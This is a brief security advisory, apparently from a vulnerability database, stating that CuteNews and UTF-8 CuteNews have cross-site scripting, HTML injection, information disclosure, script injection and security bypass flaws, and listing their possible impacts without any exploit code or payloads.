CuteNews and UTF-8 CuteNews are prone to multiple vulnerabilities, including cross-site scripting, HTML-injection, information-disclosure, arbitrary-script-injection, and security-bypass issues.

Note that exploits for some of the issues may require administrator privilege.

Successful exploits may allow attackers to:
- obtain sensitive information
- gain unauthorized access to the affected application
- run arbitrary script code in the browser of an unsuspecting user in the context of the affected site
- hijack user sessions
- execute arbitrary commands in the context of the webserver process

A successful attack will compromise the application and may aid in further attacks.
